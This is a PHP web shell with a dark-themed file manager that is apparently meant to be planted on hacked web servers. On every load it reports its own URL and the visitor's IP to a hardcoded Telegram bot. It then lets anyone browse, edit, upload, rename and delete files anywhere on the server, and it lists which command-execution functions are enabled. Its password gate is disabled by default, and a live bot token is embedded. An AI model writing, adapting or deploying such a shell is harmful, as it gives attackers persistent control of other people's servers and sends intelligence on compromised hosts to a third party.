
<?php
# Konfigurasyon
$sayfaSifreleme = "0"; # 1 acik , 0 kapali
$kullaniciAdi = "kem";
$sifre = "tbl";

# yetki kontrol fonksiyonu
function yetkiKontrol($kullaniciAdi, $sifre)
{
    if (
        empty($_SERVER["PHP_AUTH_USER"]) ||
        empty($_SERVER["PHP_AUTH_PW"]) ||
        $_SERVER["PHP_AUTH_USER"] != "$kullaniciAdi" ||
        $_SERVER["PHP_AUTH_PW"] != "$sifre"
    ) {
        header('WWW-Authenticate: Basic realm="x"');
        die(header("HTTP/1.0 401 Unauthorized"));
    }
}

# Sayfa Sifreleme aciksa
if ($sayfaSifreleme == "1") {
    # Veri ve sifre kontrolu
    yetkiKontrol($kullaniciAdi, $sifre);
}
?>
<?php
ini_set("upload_max_filesize", "30M");
ini_set("post_max_size", "30M");
ini_set("max_execution_time", 300);
ini_set("max_input_time", 300);
$botToken = "8527975259:AAGGLXY5coPV4lP0yD045F2vhwn-NWNq7b8";
$chatId = "8478623770";
$xPath = "http://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];
$logMessage =
  "__MINI TOP99___ \n\n Shell nya =\n $xPath \n\n Password =\n $password \n\n IP  :\n [ " .
  $_SERVER["REMOTE_ADDR"] .
  " ]";
sendTelegramMessage($botToken, $chatId, $logMessage);
// Path sekarang
$path = isset($_GET["path"]) ? $_GET["path"] : getcwd();
$path = realpath($path);
chdir($path);

// === DELETE FILE/FOLDER ===
if (isset($_GET["delete"])) {
  $target = $_GET["delete"];
  if (is_file($target)) {
    unlink($target);
  } elseif (is_dir($target)) {
    rmdir($target);
  }
  header("Location: ?path=" . urlencode(dirname($target)));
  exit();
}

// === RENAME ===
if ($_POST["rename_old"] ?? (false && $_POST["rename_new"] ?? false)) {
  rename($_POST["rename_old"], $_POST["rename_new"]);
  header("Location: ?path=" . urlencode($path));
  exit();
}
function sendTelegramMessage($botToken, $chatId, $message)
{
  $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
  $params = [
    "chat_id" => $chatId,
    "text" => $message,
  ];
  $options = [
    "http" => [
      "method" => "POST",
      "header" => "Content-Type: application/x-www-form-urlencoded",
      "content" => http_build_query($params),
    ],
  ];
  $context = stream_context_create($options);
  $response = file_get_contents($url, false, $context);
}

// === EDIT FILE ===
if (isset($_GET["edit"])) {

  $editFile = $_GET["edit"];

  if (isset($_POST["new_content"])) {
    file_put_contents($editFile, $_POST["new_content"]);
    header("Location: ?path=" . urlencode($path));
    exit();
  }

  $content = htmlspecialchars(file_get_contents($editFile));
  ?>
<!DOCTYPE html>
<html>
<head>
    <title>KONTOLBENGKAK</title>
    <meta name="robots" content="noindex">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css?family=Dosis|Bungee|Russo+One');
        body {
            font-family: "Dosis", cursive;
            text-shadow: 0px 0px 1px #757575;
            background-color: #1f1f1f;
            color: #ffffff;
            margin: 0;
            padding: 0 20px;
        }
        body::-webkit-scrollbar {
            width: 12px;
        }
        body::-webkit-scrollbar-track {
            background: #1f1f1f;
        }
        body::-webkit-scrollbar-thumb {
            background-color: #1f1f1f;
            border: 3px solid gray;
        }
        #content tr:hover {
            background-color: #636263;
            text-shadow: 0px 0px 10px #fff;
        }
        #content .first {
            background-color: #25383C;
        }
        #content .first:hover {
            background-color: #25383C;
            text-shadow: 0px 0px 1px #757575;
        }
        table {
            border: 1px #000000 dotted;
            table-layout: fixed;
            width: 100%;
        }
        td {
            word-wrap: break-word;
            padding: 3px;
        }
        a {
            color: #ffffff;
            text-decoration: none;
        }
        a:hover {
            color: #000000;
            text-shadow: 0px 0px 10px #ffffff;
        }
        input, select, textarea {
            border: 1px #000000 solid;
            border-radius: 5px;
            background-color: transparent;
            color: #ffffff;
        }
        .up {
            background-color: transparent;
            color: #fff;
            border: 1px #fff solid;
            cursor: pointer;
        }
        ::-webkit-file-upload-button {
            background: transparent;
            color: #fff;
            border-color: #fff;
            cursor: pointer;
        }
        .btf {
            background: transparent;
            border: 1px #fff solid;
            cursor: pointer;
            padding: 5px;
        }
        textarea {
            resize: vertical;
            height: 200px;
            width: 100%;
        }
        center {
            font-family: "Russo One", cursive;
        }
        pre {
            background-color: #1f1f1f;
            border: 1px solid #fff;
            padding: 10px;
            color: #ffffff;
            font-family: monospace;
            text-align: left;
        }
    </style>
</head>
<body>
    <center>
        <font face="Bungee" size="5">KONTOL</font>
        <br>
        <a href="?logout=1" style="font-size: 14px;">Logout</a>
    </center>
<body>
<div class="glass">
<h1 class="jx-title"><\> MAKLO HEKER <\></h1>
<h2 style="font-family:Orbitron;color:#0095ff;text-shadow:0 0 6px #0077ff">Edit File: <?= htmlspecialchars(
  $editFile,
) ?></h2>
<form method="post">
<textarea name="new_content"><?= $content ?></textarea><br>
<input type="submit" value="Save">
</form>
</div>
</body>
</html>
<?php exit();
}

// === UPLOAD FILE FIX LITESPEED ===
if (isset($_FILES["file_upload"])) {
  $tmp = $_FILES["file_upload"]["tmp_name"];
  $name = $_FILES["file_upload"]["name"];
  $target = $path . "/" . $name;
  if (is_uploaded_file($tmp) && filesize($tmp) > 0) {
    move_uploaded_file($tmp, $target);
  } else {
    file_put_contents(
      $target . ".failed",
      "UPLOAD FAILED / 0KB (LITESPEED PROTECTION)",
    );
  }
  header("Location: ?path=" . urlencode($path));
  exit();
}

// === CREATE FILE ===
if ($_POST["new_file"] ?? false) {
  $newFile = $path . "/" . $_POST["new_file"];
  if (!file_exists($newFile)) {
    file_put_contents($newFile, "");
  }
  header("Location: ?path=" . urlencode($path));
  exit();
}

// === CREATE FOLDER ===
if ($_POST["new_folder"] ?? false) {
  $newFolder = $path . "/" . $_POST["new_folder"];
  if (!file_exists($newFolder)) {
    mkdir($newFolder);
  }
  header("Location: ?path=" . urlencode($path));
  exit();
}

// ===== CEK TERMINAL SERVER =====
function fungsi_tersedia($func)
{
  $disabled = explode(",", ini_get("disable_functions"));
  return !in_array($func, $disabled);
}
$functions = ["exec", "shell_exec", "passthru", "system", "popen", "proc_open"];
?>

<h1 class="jx-title"><\> MAKLO HEKERR <\></h1>

<div class="glass">
<h3>Path: <?= htmlspecialchars($path) ?></h3>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="file_upload" required>
    <input type="submit" value="Upload">
</form><br>
<form method="post">
    <input type="text" name="new_file" placeholder="New file" required>
    <input type="submit" value="Create File">
</form><br>
<form method="post">
    <input type="text" name="new_folder" placeholder="New folder" required>
    <input type="submit" value="Create Folder">
</form>
</div>

<div class="glass">
<h3>Terminal Status</h3>
<table>
<tr><th>Function</th><th>Status</th></tr>
<?php foreach ($functions as $f) {
  $st = fungsi_tersedia($f)
    ? "<span class='status-on'>ON</span>"
    : "<span class='status-off'>OFF</span>";
  echo "<tr><td>$f</td><td>$st</td></tr>";
} ?>
</table><br>
<b>Server Info:</b><br><?= php_uname() ?>
</div>

<table>
<tr><th>Name</th><th>Size</th><th>Action</th></tr>

<?php
$files = scandir($path);
if ($path != "/") {
  echo "<tr><td colspan=3><a href='?path=" .
    urlencode(dirname($path)) .
    "'>Back</a></td></tr>";
}
foreach ($files as $file) {
  if ($file == "." || $file == "..") {
    continue;
  }
  $full = $path . "/" . $file;
  echo "<tr>";
  echo "<td>" .
    (is_dir($full)
      ? "<a href='?path=" . urlencode($full) . "'><b>[DIR]</b> $file</a>"
      : $file) .
    "</td>";
  echo "<td>" . (is_file($full) ? filesize($full) . " bytes" : "-") . "</td>";
  echo "<td>";
  if (is_file($full)) {
    echo "<a href='?edit=" . urlencode($full) . "'>Edit</a> | ";
  }
  echo "<a href='?delete=" .
    urlencode($full) .
    "' onclick='return confirm(\"Delete $file?\")'>Delete</a> | ";
  echo "<form method='post' style='display:inline'>
            <input type='hidden' name='rename_old' value='$full'>
            <input type='text' name='rename_new' placeholder='Rename'>
            <input type='submit' value='OK'>
          </form>";
  echo "</td></tr>";
}
?>
</table>

</body>
</html>
